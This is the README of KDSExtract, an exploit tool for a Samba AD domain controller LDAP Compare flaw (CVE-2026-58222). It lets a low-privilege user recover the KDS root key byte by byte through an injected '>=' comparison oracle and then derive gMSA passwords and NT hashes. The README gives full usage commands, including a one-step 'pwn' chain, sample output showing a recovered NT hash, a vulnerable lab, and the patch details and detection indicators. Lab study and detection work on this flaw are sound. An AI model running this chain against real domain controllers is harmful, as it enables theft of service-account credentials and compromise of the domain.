# KDSExtract

Exploit for **CVE-2026-58222** affecting Samba AD DC LDAP `Compare`.

An authenticated low-privilege domain user can turn LDAP Compare into an ordered oracle for confidential attributes. KDSExtract uses it to recover `msKds-RootKeyData`, then derives gMSA passwords offline with MS-GKDI.

```text
low-priv user
      │
      ▼
LDAP Compare injection
      │
      ▼
ordered comparison oracle
      │
      ▼
msKds-RootKeyData
      │
      ▼
MS-GKDI / SP 800-108
      │
      ▼
gMSA password + NT hash
```

## Install

```bash
pip install .
pytest
```

Requirements:

- Python >= 3.9
- No runtime dependencies
- 45 tests, including Samba GKDI test vectors

## Usage

```bash
kdsextract check \
  --host dc \
  --user lowpriv@lab.local

kdsextract list-keys \
  --host dc \
  --user lowpriv@lab.local

kdsextract recover \
  --host dc \
  --user lowpriv@lab.local \
  --key <guid>

kdsextract list-gmsa \
  --host dc \
  --user lowpriv@lab.local

kdsextract dump-gmsa \
  --host dc \
  --user lowpriv@lab.local \
  --name 'svcgmsa$' \
  --verify-bind

kdsextract pwn \
  --host dc \
  --user lowpriv@lab.local \
  --verify-bind
```

Password sources:

```text
--password
KDSEXTRACT_PASSWORD
interactive prompt
```

Use `--json` for machine-readable output.

The client tries LDAP first and falls back to LDAPS on port 636 when required.

## Example

`check` against a vulnerable DC:

```text
VULNERABLE (CVE-2026-58222)
injected compare evaluates and confidential attributes participate
```

Against a patched DC:

```text
NOT VULNERABLE
attribute operator injection rejected
LDAP result: invalidAttributeSyntax (21)
```

Full chain:

```text
verdict: VULNERABLE

root keys:
  effd1d54-... (gmsa-reference)
  802da1146c207a75...
  queries: 576

gMSA svcgmsa$
  sid: S-1-5-21-...
  root key: effd1d54-...
  hash: SHA512
  gkid: 364,15,14

  password (utf-16 hex):
    73764bf424123f6b...

  NT hash:
    cf30eb5212fe22e696bea95f02010e05
```

## How it works

The vulnerable Samba LDAP Compare path built an internal filter similar to:

```c
talloc_asprintf("(%s=%*s)", attribute, len, data)
```

The attribute name was not validated and the assertion value was not safely encoded.

Appending `>` to the attribute changes the internal comparison from equality to `>=`.

The internal lookup also ran without `DSDB_MARK_REQ_UNTRUSTED`. Confidential attributes could therefore affect the result even though normal LDAP Search hides them.

The resulting primitive is:

```text
stored_value >= candidate ?
```

Samba compares binary values using `memcmp`, with shorter values ordered before longer ones.

KDSExtract performs a binary search for every byte. Candidate bytes are encoded as `\XX`, keeping the constructed filter printable while Samba decodes them back to binary during parsing.

A 64-byte KDS root key takes about 576 Compare requests.

## gMSA derivation

Once `msKds-RootKeyData` is recovered, no more oracle requests are needed.

KDSExtract implements:

- SP 800-108 counter-mode HMAC
- `GkdiDerivationCtx`
- L0 → L1 → L2 seed-key derivation
- `"KDS service"` derivation
- `"GMSA PASSWORD"` derivation
- 256-byte managed-password generation
- gMSA NUL post-processing
- NT hash calculation

The implementation is byte-compatible with Samba's GKDI logic and is tested against Samba's test vectors.

If `msKds-KDFParam` is not readable, KDSExtract derives both common variants:

```text
SHA512
SHA256
```

Samba-created root keys use SHA512 in the tested lab.

## Root-key discovery

Samba hides `msKds-ProvRootKey` objects from ordinary users.

KDSExtract therefore does not depend on listing the root-key container.

It follows:

```text
gMSA
  ↓
msDS-ManagedPasswordID
  ↓
root-key GUID
  ↓
root-key DN
```

The Compare oracle itself does not require normal Search access to the secret attribute.

## Lab

```bash
cd lab
./run-demo.sh
```

The lab builds:

```text
Samba 4.24.4    vulnerable
Samba 4.24.5    patched
```

Both DCs use equivalent `lab.local` environments containing:

- a KDS root key
- gMSA `svcgmsa$`
- user `lowpriv`

The vulnerable DC is tested end to end.

| Test | 4.24.4 | 4.24.5 |
| --- | --- | --- |
| injected `>=` Compare | accepted | rejected with code 21 |
| `msKds-RootKeyData` recovery | byte-exact | n/a |
| derived gMSA password | matches DC | n/a |

Ground truth:

```text
KDS root key:
samba-tool domain kds root-key list --show-secrets

gMSA password:
samba-tool user getpassword
```

The demo exits successfully only when all assertions pass.

Reset the lab with:

```bash
docker compose down -v
```

## Limitations

- TLS certificate verification is disabled for the self-signed lab DC certificates.
- gMSA passwords are 128 UTF-16 characters. Some contain unpaired surrogates and cannot be represented cleanly as a simple-bind string.
- In that case the recovered bytes and NT hash remain valid.
- Kerberos verification using the derived key is not implemented yet.

## Fix

Fixed in:

```text
Samba 4.24.5
Samba 4.23.10
Samba 4.22.11
```

Released on 2026-07-28.

The patch:

- validates LDAP attribute names with `ldb_valid_attr_name`
- encodes assertion values with `ldb_binary_encode`
- marks the internal lookup with `DSDB_MARK_REQ_UNTRUSTED`

## Detection

Useful indicators include:

- bursts of LDAP Compare requests from one connection
- attribute descriptions ending in `>`
- Compare requests against `CN=Master Root Keys`
- repeated comparisons against confidential binary attributes
- LDAP result code 21 from patched DCs

## Credits

CVE-2026-58222 was reported by OpenAI Security Research as Samba bug 16148.

Samba patches were written by Stefan Metzmacher / SerNet.

The GKDI implementation was ported from Samba and cross-checked against GoldenGMSA:

https://github.com/Semperis/GoldenGMSA

Samba advisory:

https://www.samba.org/samba/security/CVE-2026-58222.html

Project license: MIT.
